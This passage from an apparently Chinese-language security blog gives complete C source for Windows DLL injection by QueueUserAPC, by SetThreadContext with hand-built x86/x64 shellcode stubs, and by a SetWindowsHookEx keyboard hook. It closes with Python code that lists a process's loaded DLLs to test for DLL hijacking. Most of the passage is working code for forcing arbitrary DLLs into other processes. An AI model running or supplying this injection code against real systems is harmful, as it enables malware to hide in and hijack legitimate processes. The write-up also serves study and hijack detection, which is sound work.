dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line">	<span class="comment">// 打开进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 开辟内存</span></span><br><span class="line">	LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 写入内存</span></span><br><span class="line">	<span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">	PROC pfnProcAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 遍历线程</span></span><br><span class="line">	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Error: Couldn&#x27;t create snapshot.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	THREADENTRY32 te;</span><br><span class="line">	te.dwSize = <span class="keyword">sizeof</span>(te);</span><br><span class="line">	<span class="keyword">if</span> (!Thread32First(h, &amp;te)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Error: Couldn&#x27;t get first thread.\n&quot;</span>);</span><br><span class="line">		CloseHandle(h);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (Thread32Next(h, &amp;te)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (te.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">			dwThreadId = te.th32ThreadID;</span><br><span class="line">			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, dwThreadId);</span><br><span class="line">			<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;[!] Error: Couldn&#x27;t open thread %d.\n&quot;</span>, dwThreadId);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD status = QueueUserAPC((PAPCFUNC)pfnProcAddr, hThread, (ULONG_PTR)pszDllAddr);</span><br><span class="line">			<span class="keyword">if</span> (!status) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;[!] Call QueueUserAPC Failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by QueueUserAPC success in thread %d!\n&quot;</span>, dwThreadId);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(h);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h4><p>将线程挂起后直接修改线程的上下文，将加载DLL的shellcode注入其中，然后恢复线程，在执行完shellcode后线程就会返回正常执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _WIN64</span></span><br><span class="line">BYTE sc[] =</span><br><span class="line">&#123;</span><br><span class="line">	<span class="number">0x68</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0x9C</span>,	<span class="number">0x60</span>, <span class="number">0x68</span>,</span><br><span class="line">	<span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xB8</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">	<span class="number">0xCC</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x61</span>, <span class="number">0x9D</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">BYTE sc[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0x9c</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x55</span>, </span><br><span class="line">	<span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0x41</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x41</span>, <span class="number">0x55</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, </span><br><span class="line">	<span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0x48</span>, <span class="number">0xB9</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, </span><br><span class="line">	<span class="number">0xCC</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x5E</span>, <span class="number">0x41</span>, <span class="number">0x5D</span>, <span class="number">0x41</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x5B</span>, <span class="number">0x41</span>, <span class="number">0x5A</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x9D</span>, <span class="number">0x58</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !WIN_64</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoSetThreadContext</span><span class="params">(LPCSTR pszDllPath, DWORD dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">	CONTEXT ctx;</span><br><span class="line">	DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line">	<span class="comment">// 打开进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 开辟内存</span></span><br><span class="line">	LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 写入内存</span></span><br><span class="line">	<span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">	PROC pfnProcAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 开辟内存，存放shellcode</span></span><br><span class="line">	LPVOID stub = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (stub == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取线程句柄</span></span><br><span class="line">	DWORD dwThreadId = getThreadId(dwPid);</span><br><span class="line">	<span class="keyword">if</span> (dwThreadId == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hThread = OpenThread((THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME), <span class="literal">false</span>, dwThreadId);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Open thread failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 挂起线程，获取上下文</span></span><br><span class="line">	SuspendThread(hThread);</span><br><span class="line">	ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">	GetThreadContext(hThread, &amp;ctx);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _WIN64</span></span><br><span class="line">	DWORD dwOriginIP = ctx.Eip;</span><br><span class="line">	ctx.Eip = (DWORD)stub;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">	<span class="comment">// 构造shellcode，写入上下文</span></span><br><span class="line">	DWORD dwOriginProt = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(sc, <span class="keyword">sizeof</span>(sc), PAGE_EXECUTE_READWRITE, &amp;dwOriginProt);</span><br><span class="line">	<span class="built_in">memcpy</span>(sc + <span class="number">1</span>, &amp;dwOriginIP, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(sc + <span class="number">8</span>, &amp;pszDllAddr, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(sc + <span class="number">13</span>, &amp;pfnProcAddr, <span class="number">4</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	DWORD64 dwOriginIP = ctx.Rip;</span><br><span class="line">	ctx.Rip = (DWORD64)stub;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">	<span class="comment">// 构造shellcode，写入上下文</span></span><br><span class="line">	DWORD dwOriginProt = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(sc, <span class="keyword">sizeof</span>(sc), PAGE_EXECUTE_READWRITE, &amp;dwOriginProt);</span><br><span class="line">	<span class="comment">//printf(&quot;%p %p %p\n&quot;, dwOriginIP, pszDllAddr, pfnProcAddr);</span></span><br><span class="line">	<span class="built_in">memcpy</span>(sc + <span class="number">3</span>, &amp;dwOriginIP, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(sc + <span class="number">41</span>, &amp;pszDllAddr, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(sc + <span class="number">51</span>, &amp;pfnProcAddr, <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;shellcode:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(sc); i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, sc[i]);</span><br><span class="line">		<span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span> || i == <span class="keyword">sizeof</span>(sc) - <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	WriteProcessMemory(hProcess, stub, sc, <span class="keyword">sizeof</span>(sc), <span class="literal">NULL</span>);</span><br><span class="line">	SetThreadContext(hThread, &amp;ctx);</span><br><span class="line">	<span class="comment">// 恢复线程</span></span><br><span class="line">	ResumeThread(hThread);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by SetThreadContext success!\n&quot;</span>);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-消息Hook"><a href="#2-3-消息Hook" class="headerlink" title="2.3 消息Hook"></a>2.3 消息Hook</h3><h4 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx"></a>SetWindowsHookEx</h4><p>此函数在调用时会传入一个钩子函数，而在对其他进程或全部进程进行Hook时，要求此函数必须位于DLL中，所以只要我们构造的DLL中包含要Hook的函数就可以完成注入。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoSetWindowsHookEx</span><span class="params">(LPCSTR pszDllPath, DWORD dwProcessId, LPCSTR strProcName)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 获取第一个线程ID</span></span><br><span class="line">	DWORD dwThreadId = getThreadId(dwProcessId);</span><br><span class="line">	<span class="keyword">if</span> (dwThreadId == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Get thread ID failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 加载DLL和导出的函数</span></span><br><span class="line">	HMODULE dll = LoadLibraryExA(pszDllPath, <span class="literal">NULL</span>, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class="line">	<span class="keyword">if</span> (dll == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Open Dll failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	HOOKPROC hookProc = (HOOKPROC)GetProcAddress(dll, strProcName);</span><br><span class="line">	<span class="keyword">if</span> (hookProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Get proc of the dll failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Hook键盘消息</span></span><br><span class="line">	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, hookProc, dll, dwThreadId);</span><br><span class="line">	<span class="keyword">if</span> (hHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Call SetWindowsHookEx failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by SetWindowsHookEx success!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Press any key to unhook:&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">if</span> (!UnhookWindowsHookEx(hHook)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Failed to unhook\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Unhook success!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	FreeLibrary(dll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-4-反射注入"><a href="#2-4-反射注入" class="headerlink" title="2.4 反射注入"></a>2.4 反射注入</h3><p>TODO</p>
<h2 id="3-DLL劫持"><a href="#3-DLL劫持" class="headerlink" title="3 DLL劫持"></a>3 DLL劫持</h2><p>DLL劫持是在攻防中会用到的手段，在这里只探讨关于特定程序的简单DLL劫持检测，而不是对系统存在的DLL劫持风险进行检测。<br>我参考<em><strong>DLLHSC</strong></em>项目使用Python实现了简单的DLL劫持测试，没有实现Hook LoadLibrary函数进行动态检测的部分。<br>首先从注册表中获取到系统的KnownDLLs列表，凡是在此列表中存在的DLL都是无法被劫持的。<br>然后获取到程序运行后加载的所有DLL名称(不只是导入表中的，因为导入的DLL还会导入其他DLL)，同时排除掉KnownDLLs列表中已经存在的DLL以及WinSxS目录下的DLL（因为系统会对目录下的DLL加载进行安全验证）。<br>最后将准备好的payload.dll置于程序同一目录下，这个DLL会在加载时在当前目录创建一个temp文件，然后可以通过判断是否存在此文件来验证DLL是否被加载。我们不断地重命名payload.dll为已经获取到的DLL列表中的名称，如果成功创建文件则表明存在DLL劫持；如果程序崩溃则说明payload.dll可能没有实现原先DLL中的某些功能；如果程序正常启动，则认为此DLL不存在劫持。</p>
<h3 id="3-1-获取DLL列表"><a href="#3-1-获取DLL列表" class="headerlink" title="3.1 获取DLL列表"></a>3.1 获取DLL列表</h3><p>使用psutil可以直接获取到进程加载的DLL。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">known_dlls = []  </span><br><span class="line">import_dlls = []  </span><br><span class="line">load_dlls = []  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def get_known_dlls():  </span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;  </span></span><br><span class="line"><span class="string">    获取系统的KnownDlls列表  </span></span><br><span class="line"><span class="string">    :return:  </span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span>    access_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r<span class="string">&quot;SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs&quot;</span>)  </span><br><span class="line">    try:  </span><br><span class="line">       i = <span class="number">0</span>  </span><br><span class="line">       <span class="keyword">while</span> True:  </span><br><span class="line">          dll_name = winreg.EnumValue(access_key, i)[<span class="number">1</span>].lower()  </span><br><span class="line">          <span class="meta"># print(dll_name)  </span></span><br><span class="line">          known_dlls.append(dll_name)  </span><br><span class="line">          i += <span class="number">1</span>  </span><br><span class="line">    except Exception as e:  </span><br><span class="line">       print(<span class="string">&quot;[+] Read registry finished:&quot;</span>, e)  </span><br><span class="line">    finally:  </span><br><span class="line">       winreg.CloseKey(access_key)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def get_import_dlls(fileName):  </span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;  </span></span><br><span class="line"><span class="string">    显示导入表中可能被利用的DLL  </span></span><br><span class="line"><span class="string">    :return:  </span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span>    pe = PE(fileName)  </span><br><span class="line">    import_table = pe.DIRECTORY_ENTRY_IMPORT  </span><br><span class="line">    <span class="keyword">for</span> i in import_table:  </span><br><span class="line">       dll_name = i.dll.decode().lower()  </span><br><span class="line">       <span class="keyword">if</span> dll_name not in known_dlls:  </span><br><span class="line">          import_dlls.append(dll_name)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def get_load_dlls(pid):  </span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;  </span></span><br><span class="line"><span class="string">    显示载入时加载的DLL  </span></span><br><span class="line"><span class="string">    :return:  </span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span>    try:  </span><br><span class="line">       proc = psutil.Process(pid)  </span><br><span class="line">       <span class="keyword">for</span> mem in proc.memory_maps():  </span><br><span class="line">          <span class="keyword">if</span> (mem.path.endswith(<span class="string">&#x27;.dll&#x27;</span>) or mem.path.endswith(<span class="string">&#x27;.drv&#x27;</span>)) and <span class="string">&#x27;WinSxS&#x27;</span> not in mem.path:  </span><br><span class="line">             begin = mem.path.rfind(<span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span>  </span><br><span class="line">             dll_name = mem.path[begin:]  </span><br><span class="line">             <span class="keyword">if</span> dll_name not in known_dlls and dll_name not in load_dlls:  </span><br><span class="line">                load_dlls.append(dll_name)  </span><br><span class="line">    except Exception as e:  </span><br><span class="line">       print(<span class="string">&quot;[!] &quot;</span>, e)</span><br></pre></td></tr></table></figure>
